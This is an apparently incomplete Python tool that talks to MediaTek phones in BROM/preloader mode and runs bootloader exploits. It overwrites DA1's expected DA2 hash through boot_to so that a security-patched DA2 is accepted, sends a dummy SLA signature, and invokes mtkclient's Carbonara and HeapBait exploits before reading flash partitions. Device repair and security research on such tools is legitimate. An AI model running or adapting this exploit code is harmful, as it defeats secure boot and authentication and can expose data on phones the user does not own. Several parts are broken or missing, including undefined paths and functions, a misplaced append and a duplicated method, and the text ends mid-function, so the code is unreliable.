import serial
import serial.tools.list_ports
import struct
import sys
import time
import os
import hashlib

# Add mtkclient to path for direct imports
_MTKCLIENT_PATH = os.path.join(os.path.dirname(__file__), "..", "mtkclient_repo")
if os.path.exists(_MTKCLIENT_PATH) and _MTKCLIENT_PATH not in sys.path:
    sys.path.insert(0, _MTKCLIENT_PATH)

try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

if sys.platform == "win32":
    os.system("")

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

MTK_VID = 0x0E8D
KNOWN = {0x0003: "brom", 0x6000: "preloader", 0x2000: "preloader",
         0x2001: "da", 0x20FF: "preloader", 0x3000: "preloader"}
SEQ = [0xA0, 0x0A, 0x50, 0x05]
XF_MAGIC = 0xFEEEEEEF
SYNC = 0x434E5953

DEBUG = False


def dbg(*args):
    if DEBUG:
        print("[dbg]", *args, flush=True)


CHIP_NAMES = {
    0x0321: "MT6735", 0x0326: "MT6755", 0x0335: "MT6737",
    0x0507: "MT6779", 0x0551: "MT6768", 0x0562: "MT6761",
    0x0570: "MT6580", 0x0571: "MT6572", 0x0588: "MT6785",
    0x0600: "MT6853", 0x0688: "MT6771", 0x0717: "MT6765",
    0x0766: "MT6877", 0x0788: "MT6873", 0x0813: "MT6833",
    0x0816: "MT6885", 0x0886: "MT6885",
    0x0989: "MT6833 (Dimensity 700)",
    0x0996: "MT6853 (Dimensity 720)", 0x1209: "MT6985",
}

DACODE_MAP = {0x0989: 0x6833, 0x0996: 0x6853, 0x0816: 0x6885}


def chip_name(hw):
    return CHIP_NAMES.get(hw, "unknown")


def dacode_for(hw):
    return DACODE_MAP.get(hw, hw)


def search_and_open(wait, timeout=120, rom_only=False):
    label = "brom" if rom_only else "usb"
    print("Searching for %s device...." % label, end=" ", flush=True)
    start = time.time()
    while True:
        for p in serial.tools.list_ports.comports():
            if p.vid == MTK_VID:
                mode = KNOWN.get(p.pid, "unknown")
                if rom_only and mode != "brom":
                    continue
                baud = 115200 if mode == "brom" else 921600
                try:
                    s = serial.Serial(p.device, baud, timeout=10)
                    print(GREEN + "OK" + RESET, flush=True)
                    return s, p.device, mode
                except Exception:
                    continue
        if not wait or time.time() - start > timeout:
            break
        time.sleep(0.5)
    print(RED + "Failed" + RESET, flush=True)
    return None, None, None


def open_serial(port_name, baud, retries=5):
    for i in range(retries):
        try:
            return serial.Serial(port_name, baud, timeout=10)
        except Exception:
            time.sleep(0.3)
    raise Exception("cannot open %s" % port_name)


def read_exact(s, n):
    b = b""
    while len(b) < n:
        c = s.read(n - len(b))
        if not c:
            raise Exception("timeout reading %d bytes" % n)
        b += c
    return b


class Pl:
    def __init__(self, s):
        self.s = s

    def echo(self, data):
        self.s.write(data)
        resp = read_exact(self.s, len(data))
        if resp != data:
            raise Exception("echo mismatch sent %s got %s" % (data.hex(), resp.hex()))

    def status_ok(self):
        st = struct.unpack(">H", read_exact(self.s, 2))[0]
        if st != 0:
            raise Exception("status not ok 0x%04X" % st)

    def read_u16be(self):
        return struct.unpack(">H", read_exact(self.s, 2))[0]

    def handshake(self):
        self.s.write(bytes([SEQ[0]]))
        for attempt in range(5):
            ok = True
            for b in SEQ:
                self.s.write(bytes([b]))
                resp = read_exact(self.s, 1)[0]
                if resp == (b ^ 0xFF):
                    continue
                elif resp == SEQ[0]:
                    return
                else:
                    ok = False
                    break
            if ok:
                return
            self.s.reset_input_buffer()
        raise Exception("handshake failed")

    def get_target_config(self):
        self.echo(b"\xD8")
        config = struct.unpack(">I", read_exact(self.s, 4))[0]
        self.status_ok()
        return config

    def get_hw_code(self):
        self.echo(b"\xFD")
        hw = self.read_u16be()
        self.status_ok()
        return hw

    def get_hw_sw_ver(self):
        self.echo(b"\xFC")
        sub = self.read_u16be()
        hwv = self.read_u16be()
        swv = self.read_u16be()
        self.status_ok()
        return sub, hwv, swv

    def get_target_config(self):
        self.echo(b"\xD8")
        config = struct.unpack(">I", read_exact(self.s, 4))[0]
        self.status_ok()
        return config

    def send_da(self, addr, data, sig_len):
        self.echo(b"\xD7")
        self.echo(struct.pack(">I", addr))
        self.echo(struct.pack(">I", len(data)))
        self.echo(struct.pack(">I", sig_len))
        self.status_ok()
        self.s.write(data)
        dbg("checksum resp:", read_exact(self.s, 2).hex())
        self.status_ok()

    def jump_da(self, addr):
        self.echo(b"\xD5")
        self.echo(struct.pack(">I", addr))
        self.status_ok()


class Xf:
    def __init__(self, s):
        self.s = s
        self.wpkt = 0x8000

    def write_packet(self, data):
        hdr = struct.pack("<III", XF_MAGIC, 1, len(data))
        dbg("TX", hdr.hex(), data.hex()[:96])
        self.s.write(hdr)
        pos = 0
        while pos < len(data):
            end = min(pos + self.wpkt, len(data))
            self.s.write(data[pos:end])
            pos = end

    def read_packet(self):
        hdr = read_exact(self.s, 12)
        dbg("RX", hdr.hex())
        magic, dtype, length = struct.unpack("<III", hdr)
        if magic != XF_MAGIC:
            raise Exception("bad magic 0x%08X" % magic)
        if dtype == 2:
            payload = read_exact(self.s, length)
            dbg("RX-msg", payload.hex()[:96])
            return self.read_packet()
        data = read_exact(self.s, length)
        dbg("RX", data.hex()[:96])
        return data

    def read_status(self):
        data = self.read_packet()
        return struct.unpack("<I", data[:4])[0]

    def status_ok(self):
        st = self.read_status()
        if st != 0:
            raise Exception("xflash status 0x%08X" % st)

    def send_data(self, chunks):
        for c in chunks:
            self.write_packet(c)
        self.status_ok()

    def send_cmd(self, cmd):
        self.send_data([struct.pack("<I", cmd)])

    def devctrl(self, cmd, params=None):
        self.send_cmd(0x010009)
        self.send_cmd(cmd)
        if params is not None:
            self.send_data(params)
            return b""
        data = self.read_packet()
        self.status_ok()
        return data

    # --- XML command layer (DA2 auth) ---

    def send_xml(self, xml_str):
        """Send XML command string to DA2 via binary packet layer."""
        data = xml_str.encode("utf-8")
        # Try sending as type-1 binary command packet
        self.write_packet(data)

    def read_xml_response(self, timeout=5):
        """Read XML response from DA2."""
        old_timeout = self.s.timeout
        self.s.timeout = timeout
        try:
            return self.read_packet()
        except Exception:
            return None
        finally:
            self.s.timeout = old_timeout

    def send_allinone_sign(self, sign_data):
        """Send CMD:SECURITY-SET-ALLINONE-SIGNATURE with binary data."""
        xml = '<?xml version="1.0" encoding="UTF-8"?>'
        xml += '<da><version>1.0</version>'
        xml += '<command>CMD:SECURITY-SET-ALLINONE-SIGNATURE</command>'
        xml += '<arg><source_file>allinone_signature</source_file></arg>'
        xml += '</da>'
        self.send_xml(xml)
        # Read response
        resp = self.read_xml_response(3)
        dbg("allinone_sign resp:", resp)
        return resp

    def send_set_security_policy(self, policy_data):
        """Send CMD:SECURITY-SET-FLASH-POLICY with policy data."""
        xml = '<?xml version="1.0" encoding="UTF-8"?>'
        xml += '<da><version>1.0</version>'
        xml += '<command>CMD:SECURITY-SET-FLASH-POLICY</command>'
        xml += '<arg><source_file>security_policy</source_file></arg>'
        xml += '</da>'
        self.send_xml(xml)
        resp = self.read_xml_response(3)
        dbg("set_security_policy resp:", resp)
        return resp

    def get_packet_length(self):
        d = self.devctrl(0x040007)
        if len(d) >= 8:
            w, r = struct.unpack("<II", d[:8])
            dbg("packet len write=0x%X read=0x%X" % (w, r))
            if w > 0 and w < 0x8000:
                self.wpkt = w
            return w, r
        return None, None

    def da1_sync(self):
        sync = read_exact(self.s, 1)
        dbg("sync byte 0x%02X" % sync[0])
        if sync[0] != 0xC0:
            raise Exception("bad sync byte 0x%02X" % sync[0])
        self.write_packet(struct.pack("<I", SYNC))
        env = struct.pack("<IIIII", 1, 1, 0, 0, 0)
        self.send_data([struct.pack("<I", 0x010100), env])
        self.send_data([struct.pack("<I", 0x010101), b"\x00\x00\x00\x00"])
        st = self.read_status()
        dbg("sync signal status 0x%08X" % st)
        if st != SYNC and st != 0:
            raise Exception("bad sync signal 0x%08X" % st)
        agent = self.devctrl(0x04000A)
        dbg("connection agent:", agent)
        self.devctrl(0x020003, [struct.pack("<I", 0)])

    def boot_to(self, addr, data):
        """Boot to address with data. Matches mtkclient xflash_lib.py boot_to."""
        # 1. Send BOOT_TO command
        self.send_cmd(0x010008)
        # 2. Wait for status response
        time.sleep(0.5)
        st = self.read_status()
        if st != 0:
            raise Exception("boot_to cmd status 0x%08X" % st)
        # 3. Send addr + length + data as ONE continuous write
        param = struct.pack("<QQ", addr, len(data))
        self.s.write(param + data)
        self.s.flush()
        # 4. Wait for DA to process
        time.sleep(3)
        # 5. Read final status
        old_timeout = self.s.timeout
        self.s.timeout = 10
        try:
            st = self.read_status()
            dbg("boot_to final status: 0x%08X" % st)
            if st != 0 and st != SYNC:
                raise Exception("boot_to data status 0x%08X" % st)
        except Exception as e:
            dbg("boot_to read_status: %s (may be OK if DA jumped)" % e)
        finally:
            self.s.timeout = old_timeout

    def handle_sla(self):
        # SLA check + dummy signature (matches penumbra handle_sla flow).
        try:
            resp = self.devctrl(0x040016)
            sla_enabled = resp[:4] == struct.pack("<I", 1)
            dbg("SLA enabled:", sla_enabled)
            if not sla_enabled:
                return
        except Exception:
            dbg("SLA status check failed")
            return

        # Try dummy signature directly, without GetDevFwInfo first.
        dummy_sig = b"\x00" * 256
        try:
            self.devctrl(0x02000B, [dummy_sig])
            dbg("SLA dummy sig accepted")
        except Exception as e:
            dbg("SLA dummy sig rejected:", e)

    def post_da2_init(self):
        self.handle_sla()
        try:
            self.get_packet_length()
        except Exception as e:
            dbg("post-DA2 get_packet_length:", e)

    def detect_storage(self):
        for cmd, name in [(0x040001, "emmc"), (0x040004, "ufs")]:
            try:
                d = self.devctrl(cmd)
                typ = struct.unpack("<I", d[:4])[0]
                dbg("%s type 0x%X data %s" % (name, typ, d[:40].hex()))
                if typ == 0x1:
                    return 0x1, None
                if typ == 0x30:
                    return 0x30, d
            except Exception as e:
                dbg("%s err: %s" % (name, e))
        raise Exception("no storage")

    def get_ufs_user_offset(self, ufs_info):
        # UFS: user partition (LUA2) starts after LUA0 + LUA1.
        if ufs_info is None:
            return 0
        block_size = struct.unpack_from("<I", ufs_info, 4)[0]
        lu0 = struct.unpack_from("<Q", ufs_info, 8)[0]
        lu1 = struct.unpack_from("<Q", ufs_info, 16)[0]
        if block_size and lu0 and lu1:
            return lu0 + lu1
        return 0

    def read_flash(self, addr, size, st):
        # For UFS, user partition (LUA2) has partition_type=3; eMMC user is 0.
        part_type = 3 if st == 0x30 else 0
        params = struct.pack("<IIQQ", st, part_type, addr, size) + b"\x00" * 32
        self.send_cmd(0x010005)
        self.send_data([params])
        self.status_ok()
        out = b""
        while len(out) < size:
            chunk = self.read_packet()
            if not chunk:
                break
            out += chunk
            self.send_data([struct.pack("<I", 0)])
        return out

    def read_partition(self, name):
        # Read a partition by name using the Upload command (like penumbra).
        self.send_cmd(0x010002)
        self.send_data([name.encode()])
        size_data = self.read_packet()
        self.status_ok()
        size = struct.unpack("<Q", size_data[:8])[0]
        out = b""
        while len(out) < size:
            chunk = self.read_packet()
            if not chunk:
                break
            out += chunk
            self.send_data([struct.pack("<I", 0)])
        return out


def parse_da(data):
    if data[:18] != b"MTK_DOWNLOAD_AGENT":
        raise Exception("not hacc DA")
    version = struct.unpack("<I", data[96:100])[0]
    count = struct.unpack("<I", data[104:108])[0]
    esize = 0xDC if version == 4 else 0xD8
    entries = []
    pos = 0x6C
    for _ in range(count):
        hw = struct.unpack("<H", data[pos + 2:pos + 4])[0]
        sub = struct.unpack("<H", data[pos + 4:pos + 6])[0]
        if version == 4:
            rc = struct.unpack("<H", data[pos + 18:pos + 20])[0]
            roff = pos + 20
        else:
            rc = struct.unpack("<H", data[pos + 14:pos + 16])[0]
            roff = pos + 16
        regions = []
        for i in range(rc):
            o, l, a, rl, sg = struct.unpack("<IIIII", data[roff + i * 20:roff + i * 20 + 20])
            regions.append((o, l, a, rl, sg))
    entries.append((hw, sub, regions))
    pos += esize
    return entries


class Thumb2Analyzer:
    # Thumb2 binary analyzer for DA2 patching, ported from penumbra.

    def __init__(self, data, base_addr):
        self.data = data
        self.base = base_addr

    def read_u16(self, off):
        if off + 1 >= len(self.data):
            return None
        return struct.unpack_from("<H", self.data, off)[0]

    def read_u32(self, off):
        if off + 3 >= len(self.data):
            return None
        return struct.unpack_from("<I", self.data, off)[0]

    def read_thumb32(self, off):
        hw1 = self.read_u16(off)
        hw2 = self.read_u16(off + 2)
        if hw1 is None or hw2 is None:
            return None
        return (hw1 << 16) | hw2

    def is_wide(self, off):
        hw = self.read_u16(off)
        if hw is None:
            return False
        top5 = hw >> 11
        return top5 in (0b11101, 0b11110, 0b11111)

    def instr_size(self, off):
        return 4 if self.is_wide(off) else 2

    def va_to_off(self, va):
        va_clean = va & ~1
        if va_clean < self.base:
            return None
        off = va_clean - self.base
        if off >= len(self.data):
            return None
        return off

    def off_to_va(self, off):
        if off >= len(self.data):
            return None
        return self.base + off

    @staticmethod
    def decode_movw(instr):
        if (instr & 0xFBF08000) != 0xF2400000:
            return None
        imm4 = (instr >> 16) & 0xF
        i = (instr >> 26) & 1
        imm3 = (instr >> 12) & 0x7
        rd = (instr >> 8) & 0xF
        imm8 = instr & 0xFF
        imm16 = (imm4 << 12) | (i << 11) | (imm3 << 8) | imm8
        return (rd, imm16)

    @staticmethod
    def decode_movt(instr):
        if (instr & 0xFBF08000) != 0xF2C00000:
            return None
        imm4 = (instr >> 16) & 0xF
        i = (instr >> 26) & 1
        imm3 = (instr >> 12) & 0x7
        rd = (instr >> 8) & 0xF
        imm8 = instr & 0xFF
        imm16 = (imm4 << 12) | (i << 11) | (imm3 << 8) | imm8
        return (rd, imm16)

    @staticmethod
    def decode_ldr_pc(instr, pc):
        if (instr & 0xFF7F0000) != 0xF85F0000:
            return None
        u_bit = (instr >> 23) & 1
        rt = (instr >> 12) & 0xF
        imm12 = instr & 0xFFF
        align_pc = (pc + 4) & ~3
        if u_bit:
            target = (align_pc + imm12) & 0xFFFFFFFF
        else:
            target = (align_pc - imm12) & 0xFFFFFFFF
        return (rt, target)

    @staticmethod
    def decode_bl(instr, pc):
        hw1 = instr >> 16
        hw2 = instr & 0xFFFF
        if (hw1 >> 11) != 0b11110:
            return None
        if (hw2 & 0xC000) != 0xC000:
            return None
        s = (hw1 >> 10) & 1
        imm10 = hw1 & 0x3FF
        j1 = (hw2 >> 13) & 1
        j2 = (hw2 >> 11) & 1
        imm11 = hw2 & 0x7FF
        i1 = (~(j1 ^ s)) & 1
        i2 = (~(j2 ^ s)) & 1
        offset = (s << 24) | (i1 << 23) | (i2 << 22) | (imm10 << 12) | (imm11 << 1)
        if s:
            offset |= 0xFE000000
        offset = struct.unpack("<i", struct.pack("<I", offset))[0]
        return ((pc + 4 + offset) & 0xFFFFFFFFFFFFFFFF)

    def bl_target(self, off):
        instr = self.read_thumb32(off)
        if instr is None:
            return None
        pc = self.base + off
        return self.decode_bl(instr, pc)

    def is_prologue(self, off):
        instr = self.read_thumb32(off)
        if instr is not None:
            hw1 = instr >> 16
            if hw1 == 0xE92D and (instr & (1 << 14)):
                return True
        hw = self.read_u16(off)
        if hw is not None and (hw & 0xFF00) == 0xB500:
            return True
        return False

    def find_function_start(self, from_off):
        limit = 0x2000
        end = max(0, from_off - limit)
        cur = from_off
        while cur >= end and cur > 0:
            if self.is_prologue(cur):
                return cur
            if cur < 2:
                break
            cur -= 2
        return None

    def find_string(self, target):
        tb = target.encode()
        with_null = tb + b"\x00"
        idx = self.data.find(with_null)
        if idx != -1:
            return idx
        return self.data.find(tb)

    def str_xref(self, target_str):
        str_off = self.find_string(target_str)
        if str_off is None:
            return None
        str_va = (self.base + str_off) & 0xFFFFFFFF
        low16 = str_va & 0xFFFF
        high16 = (str_va >> 16) & 0xFFFF
        data = self.data
        n = len(data)

        # movw + movt
        off = 0
        while off + 8 < n:
            if not self.is_wide(off):
                off += 2
                continue
            instr1 = self.read_thumb32(off)
            if instr1 is None:
                break
            decoded = self.decode_movw(instr1)
            if decoded is None or decoded[1] != low16:
                off += 4
                continue
            reg = decoded[0]
            la_end = min(off + 20 * 4, n)
            la = off + 4
            while la < la_end:
                sz = self.instr_size(la)
                if sz == 4:
                    instr2 = self.read_thumb32(la)
                    if instr2 is not None:
                        dec2 = self.decode_movt(instr2)
                        if dec2 is not None and dec2[0] == reg and dec2[1] == high16:
                            return off
                la += sz
            off += 4

        # LDR literal (Thumb2 wide)
        off = 0
        while off + 4 <= n:
            if self.is_wide(off):
                instr = self.read_thumb32(off)
                if instr is not None:
                    pc = self.base + off
                    ldr = self.decode_ldr_pc(instr, pc)
                    if ldr is not None and ldr[1] == str_va:
                        return off
                    pool_off = self.va_to_off(ldr[1]) if ldr else None
                    if pool_off is not None:
                        val = self.read_u32(pool_off)
                        if val is not None and val == str_va:
                            return off
                off += 4
            else:
                hw = self.read_u16(off)
                if hw is not None and (hw & 0xF800) == 0x4800:
                    imm8 = hw & 0xFF
                    pc = self.base + off
                    target = ((pc + 4) & ~3) + (imm8 << 2)
                    pool_off = self.va_to_off(target)
                    if pool_off is not None:
                        val = self.read_u32(pool_off)
                        if val is not None:
                            vc = val & ~1
                            if vc == str_va or val == str_va:
                                return off
                off += 2

        return None

    def fn_from_str(self, s):
        xref = self.str_xref(s)
        if xref is None:
            return None
        return self.find_function_start(xref)

    def next_bl_from_off(self, start):
        off = start
        n = len(self.data)
        while off < n:
            sz = self.instr_size(off)
            if off + sz > n:
                return None
            if sz == 4:
                instr = self.read_thumb32(off)
                if instr is not None:
                    hw2 = instr & 0xFFFF
                    if (instr >> 27) == 0b11110 and (hw2 & 0xD000) == 0xD000:
                        return off
            off += sz
        return None


def find_pattern(data, pattern, offset=0):
    if not pattern or offset > len(data) - len(pattern):
        return None
    idx = data.find(pattern, offset)
    return idx if idx != -1 else None


def patch_bytes(data, off, patch_data):
    data[off:off + len(patch_data)] = patch_data


def patch_u32(data, from_val, to_val):
    from_b = struct.pack("<I", from_val)
    to_b = struct.pack("<I", to_val)
    idx = find_pattern(bytes(data), from_b)
    if idx is None:
        return None
    patch_bytes(data, idx, to_b)
    return idx


def get_hash_type(hash_data):
    if len(hash_data) < 16:
        return None
    delimiter = b"\x00" * 8
    idx = hash_data[16:].find(delimiter)
    if idx == -1:
        hlen = len(hash_data)
    else:
        hlen = idx + 16
    if hlen == 16:
        return "md5"
    if hlen == 20:
        return "sha1"
    if hlen == 32:
        return "sha256"
    return None


def compute_hash(hash_type, data):
    if hash_type == "md5":
        return hashlib.md5(data).digest()
    if hash_type == "sha1":
        return hashlib.sha1(data).digest()
    if hash_type == "sha256":
        return hashlib.sha256(data).digest()
    return b""


FORCE_RETURN = b"\x00\x20\x70\x47"
DA_HASH_MISMATCH = 0xC0070004
DA_ANTI_ROLLBACK = 0xC0020053

# Carbonara protection patterns (from Penumbra/mtkclient)
CARBONARA_PROTECT_PATTERNS = [
    b"\x01\x01\x54\xE3\x01\x14\xA0\xE3",
    b"\x08\x00\xA8\x52\xFF\x02\x08\xEB",
    b"\x06\x9B\x4F\xF0\x80\x40\x02\xA9",
    b"\x32\x6E\x64\x20\x44\x41\x20\x61\x64\x64\x72\x65\x73\x73\x20\x69\x73\x20\x69\x6E\x76\x61\x6C\x69\x64\x2E",
]


def carbonara_is_vulnerable(da1_data):
    """Check if DA1 is vulnerable to Carbonara (no protection patterns)."""
    for pat in CARBONARA_PROTECT_PATTERNS:
        if pat in da1_data:
            dbg("carbonara: protection pattern found at 0x%X" % da1_data.find(pat))
            return False
    return True


def carbonara_find_hash_offset(da1_data, da1_sig_len):
    """Find where DA1 stores the expected DA2 hash.

    V6 format: hash is at da1_len - da1_sig_len - 0x30 (before signature area).
    We also try scanning for known hash patterns (MD5=16, SHA1=20, SHA256=32 bytes
    of non-zero data near the end of DA1 code area).
    """
    # V6 calculation
    v6_off = len(da1_data) - da1_sig_len - 0x30
    if v6_off > 0 and v6_off + 32 <= len(da1_data):
        chunk = da1_data[v6_off:v6_off + 32]
        # Check it's not all zeros and not all 0xFF
        if any(b != 0 for b in chunk) and any(b != 0xFF for b in chunk):
            dbg("carbonara: V6 hash offset 0x%X" % v6_off)
            return v6_off

    # Scan backward from signature area for hash-like data
    scan_start = max(0, len(da1_data) - da1_sig_len - 0x100)
    scan_end = len(da1_data) - da1_sig_len
    for off in range(scan_end - 32, scan_start, -1):
        chunk = da1_data[off:off + 32]
        if any(b != 0 for b in chunk) and any(b != 0xFF for b in chunk):
            # Check if it looks like a hash (mixed bytes, not a string)
            unique = len(set(chunk))
            if unique > 8:
                dbg("carbonara: scanned hash offset 0x%X (unique=%d)" % (off, unique))
                return off

    return None


def carbonara_get_hash_type(da1_data, hash_off):
    """Determine hash type by examining the data at hash offset."""
    if hash_off is None:
        return "sha256"
    chunk = da1_data[hash_off:hash_off + 32]
    # If data is all non-zero in first 16 bytes but zero in 16-32, likely MD5
    if all(b != 0 for b in chunk[:16]) and all(b == 0 for b in chunk[16:32]):
        return "md5"
    # If data fills 20 bytes, likely SHA1
    if all(b != 0 for b in chunk[:20]) and all(b == 0 for b in chunk[20:32]):
        return "sha1"
    # Default SHA256
    return "sha256"


def carbonara_run(xf, da1_data, da1_addr, da1_sig_len, da2_data, da2_addr, da2_sig_len):
    """Execute Carbonara exploit: write modified DA2 hash into DA1 memory via boot_to.

    Flow:
    1. Check DA1 vulnerability
    2. Find hash offset in DA1
    3. Patch DA2 (disable security checks)
    4. Compute hash of patched DA2
    5. boot_to(hash_addr_in_DA1_memory, new_hash) -> overwrites stored hash
    6. Return patched DA2 for normal boot_to
    """
    print("Carbonara exploit...", end=" ", flush=True)

    # 1. Check vulnerability
    if not carbonara_is_vulnerable(da1_data):
        print(RED + "DA1 patched (not vulnerable)" + RESET)
        return None

    # 2. Find hash offset
    hash_off = carbonara_find_hash_offset(da1_data, da1_sig_len)
    if hash_off is None:
        print(RED + "hash offset not found" + RESET)
        return None

    hash_type = carbonara_get_hash_type(da1_data, hash_off)
    hash_addr = da1_addr + hash_off
    dbg("carbonara: hash_off=0x%X hash_addr=0x%X type=%s" % (hash_off, hash_addr, hash_type))

    # 3. Patch DA2
    patched_da2 = patch_da2(da2_data, da2_addr)

    # 4. Compute new hash
    hash_len = {"md5": 16, "sha1": 20, "sha256": 32}.get(hash_type, 32)
    new_hash = compute_hash(hash_type, patched_da2[:len(patched_da2) - da2_sig_len])
    dbg("carbonara: new_hash=%s" % new_hash.hex())

    # 5. Write hash into DA1 memory via boot_to
    try:
        xf.boot_to(hash_addr, new_hash)
        dbg("carbonara: hash written to 0x%X" % hash_addr)
    except Exception as e:
        dbg("carbonara: boot_to hash failed: %s" % e)
        print(RED + "hash write failed" + RESET)
        return None

    print(GREEN + "OK" + RESET)
    return patched_da2


def stock_da2_boot(xf, vendor_da1, vendor_da1_addr, vendor_da1_sig_len):
    """Try booting the UNPATCHED stock DA2 to test if boot_to works."""
    stock_path = _STOCK_V5_PATH if os.path.exists(_STOCK_V5_PATH) else _STOCK_V6_PATH
    if not os.path.exists(stock_path):
        return None

    stock_data = open(stock_path, "rb").read()
    if stock_data[:18] != b'MTK_DOWNLOAD_AGENT':
        return None

    ver = int.from_bytes(stock_data[96:100], 'little')
    count = int.from_bytes(stock_data[104:108], 'little')
    esize = 0xDC if ver == 4 else 0xD8

    pos = 0x6C
    for i in range(count):
        hw = int.from_bytes(stock_data[pos+2:pos+4], 'little')
        if hw in (0x0813, 0x0989, 0x6833):
            rc = int.from_bytes(stock_data[pos+18:pos+20], 'little') if ver == 4 else int.from_bytes(stock_data[pos+14:pos+16], 'little')
            roff = pos + 20 if ver == 4 else pos + 16
            sd2_off, sd2_len, sd2_addr, _, sd2_sig = struct.unpack('<IIIII', stock_data[roff+40:roff+60])
            stock_da2 = stock_data[sd2_off:sd2_off+sd2_len]
            dbg("stock test: DA2 %d bytes @ 0x%08X sig=0x%X" % (sd2_len, sd2_addr, sd2_sig))
            try:
                xf.boot_to(sd2_addr, stock_da2)
                dbg("stock test: boot_to OK!")
                return stock_da2, sd2_addr
            except Exception as e:
                dbg("stock test: boot_to failed: %s" % e)
                return None
        pos += esize
    return None


def try_mtkclient_exploit(port_name, da_path, hw_code):
    """Try using mtkclient's full library for exploit + DA loading."""
    try:
        from mtkclient.Library.mtk_class import Mtk
        from mtkclient.Library.DA.mtk_daloader import DAconfig
        from mtkclient.config.mtk_config import MtkConfig
        from mtkclient.Library.Exploit.carbonara import Carbonara
        from mtkclient.Library.Exploit.heapbait import Heapbait
        import logging

        print("Using mtkclient library...", end=" ", flush=True)

        # Initialize mtkclient config
        config = MtkConfig(logging.WARNING)
        config.init_hwcode(hw_code)
        config.hwver = 0xCA00
        config.swver = 0
        config.loader = da_path
        config.preloader = None
        config.serialportname = port_name

        # Create Mtk instance
        mtk = Mtk(config=config, loglevel=logging.WARNING,
                  serialportname=port_name)

        # Try to setup and connect
        mtk.setup(serialportname=port_name)
        print(GREEN + "connected" + RESET)

        # Try Carbonara
        print("  Trying Carbonara...", end=" ", flush=True)
        try:
            carbo = Carbonara(mtk, loglevel=logging.WARNING)
            if carbo.patchda1_and_upload_da2():
                print(GREEN + "OK" + RESET)
                mtk.daloader.patch = True
            else:
                print(RED + "failed" + RESET)
        except Exception as e:
            dbg("Carbonara error:", e)
            print(RED + "error" + RESET)

        # Try HeapBait if Carbonara failed
        if not mtk.daloader.patch:
            print("  Trying HeapBait...", end=" ", flush=True)
            try:
                hb = Heapbait(mtk, loglevel=logging.WARNING)
                if hb.run_exploit():
                    print(GREEN + "OK" + RESET)
                    mtk.daloader.patch = True
                else:
                    print(RED + "failed" + RESET)
            except Exception as e:
                dbg("HeapBait error:", e)
                print(RED + "error" + RESET)

        if mtk.daloader.patch:
            print("Exploit succeeded!")
            return True
        else:
            print("All exploits failed")

        mtk.close()
    except ImportError as e:
        dbg("mtkclient import error:", e)
        print(RED + "mtkclient not available: %s" % e + RESET)
    except Exception as e:
        dbg("mtkclient error:", e)
        print(RED + "error: %s" % e + RESET)

    return False


def carbonara_stock_run(xf, vendor_da1, vendor_da1_addr, vendor_da1_sig_len, vendor_da2_addr):
    """Carbonara exploit using stock DA (mtkclient approach).

    The vendor DA1 is patched, but we can use a STOCK DA's DA2 instead.
    Flow:
    1. Load stock DA (MTK_DA_V5.bin)
    2. Find MT6833 entry in stock DA
    3. Check stock DA1 is vulnerable (it should be)
    4. Find hash offset in STOCK DA1 (not vendor DA1!)
    5. Patch stock DA2 (disable security checks)
    6. Compute hash of patched stock DA2
    7. Write hash into STOCK DA1 via boot_to (at stock DA1's hash offset)
    8. Boot patched stock DA2 instead of vendor DA2
    """
    print("Carbonara (stock DA)...", end=" ", flush=True)

    # Find stock DA
    stock_path = _STOCK_V5_PATH if os.path.exists(_STOCK_V5_PATH) else _STOCK_V6_PATH
    if not os.path.exists(stock_path):
        print(RED + "stock DA not found" + RESET)
        return None

    stock_data = open(stock_path, "rb").read()
    if stock_data[:18] != b'MTK_DOWNLOAD_AGENT':
        print(RED + "invalid stock DA" + RESET)
        return None

    ver = int.from_bytes(stock_data[96:100], 'little')
    count = int.from_bytes(stock_data[104:108], 'little')
    esize = 0xDC if ver == 4 else 0xD8

    # Find MT6833 entry in stock DA
    pos = 0x6C
    stock_entry = None
    for i in range(count):
        hw = int.from_bytes(stock_data[pos+2:pos+4], 'little')
        sub = int.from_bytes(stock_data[pos+4:pos+6], 'little')
        if hw in (0x0813, 0x0989, 0x6833):
            stock_entry = pos
            dbg("stock: found MT6833 entry %d hw=0x%04X sub=0x%04X" % (i, hw, sub))
            break
        pos += esize

    if stock_entry is None:
        print(RED + "MT6833 not in stock DA" + RESET)
        return None

    # Get stock DA1 and DA2
    rc = int.from_bytes(stock_data[stock_entry+18:stock_entry+20], 'little') if ver == 4 else int.from_bytes(stock_data[stock_entry+14:stock_entry+16], 'little')
    roff = stock_entry + 20 if ver == 4 else stock_entry + 16
    stock_da1_off, stock_da1_len, stock_da1_addr, _, stock_da1_sig = struct.unpack('<IIIII', stock_data[roff+20:roff+40])
    stock_da2_off, stock_da2_len, stock_da2_addr, _, stock_da2_sig = struct.unpack('<IIIII', stock_data[roff+40:roff+60])
    stock_da1 = stock_data[stock_da1_off:stock_da1_off+stock_da1_len]
    stock_da2 = stock_data[stock_da2_off:stock_da2_off+stock_da2_len-stock_da2_sig]

    dbg("stock DA1: %d bytes @ 0x%08X sig=0x%X" % (stock_da1_len, stock_da1_addr, stock_da1_sig))
    dbg("stock DA2: %d bytes @ 0x%08X sig=0x%X" % (stock_da2_len, stock_da2_addr, stock_da2_sig))

    # Check stock DA1 is vulnerable
    if not carbonara_is_vulnerable(stock_da1):
        print(RED + "stock DA1 also patched" + RESET)
        return None

    # Find hash offset in STOCK DA1 (not vendor DA1!)
    hash_off = carbonara_find_hash_offset(stock_da1, stock_da1_sig)
    if hash_off is None:
        print(RED + "stock hash offset not found" + RESET)
        return None

    hash_type = carbonara_get_hash_type(stock_da1, hash_off)
    hash_addr = stock_da1_addr + hash_off
    dbg("stock carbonara: stock hash_off=0x%X hash_addr=0x%X" % (hash_off, hash_addr))

    # Patch stock DA2
    patched_stock_da2 = patch_da2(stock_da2, stock_da2_addr)

    # Compute hash of patched stock DA2
    hash_len = {"md5": 16, "sha1": 20, "sha256": 32}.get(hash_type, 32)
    new_hash = compute_hash(hash_type, patched_stock_da2)
    dbg("stock carbonara: new_hash=%s" % new_hash.hex())

    # Write hash into STOCK DA1 via boot_to (at stock DA1's hash offset)
    # Both vendor DA1 and stock DA1 load at 0x00200000, so the memory is the same.
    # The hash offset differs between them — we use the STOCK one.
    try:
        xf.boot_to(hash_addr, new_hash)
        dbg("stock carbonara: hash written to stock DA1 @ 0x%X" % hash_addr)
